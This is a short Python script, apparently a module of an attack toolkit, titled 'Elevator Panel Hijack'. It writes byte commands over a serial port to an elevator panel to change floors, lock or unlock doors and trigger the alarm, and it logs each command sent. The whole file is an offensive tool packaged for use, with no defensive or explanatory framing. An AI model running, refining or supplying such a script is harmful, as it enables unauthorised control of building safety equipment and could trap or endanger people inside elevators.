#!/usr/bin/env python3
# modules/attacks/elevator_panel_hijack.py

import serial
import time
import argparse
import os

LOG = "results/elevator_hijack.log"
COMMANDS = {
    "floor_1": b'\x02\x31\x03',
    "floor_2": b'\x02\x32\x03',
    "lock_doors": b'\x02\x4C\x03',
    "unlock_doors": b'\x02\x55\x03',
    "alarm": b'\x02\x41\x03'
}

def log(msg):
    os.makedirs("results", exist_ok=True)
    with open(LOG, "a") as f:
        f.write(f"{time.ctime()} | {msg}\n")

def send_cmd(port, cmd):
    try:
        with serial.Serial(port, 9600, timeout=1) as ser:
            ser.write(COMMANDS[cmd])
            log(f"Sent command: {cmd}")
    except Exception as e:
        log(f"[ERROR] {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Elevator Panel Hijack")
    parser.add_argument("--port", required=True, help="Serial port (e.g., /dev/ttyUSB0)")
    parser.add_argument("--cmd", required=True, choices=COMMANDS.keys(), help="Command to send")
    args = parser.parse_args()
    send_cmd(args.port, args.cmd)
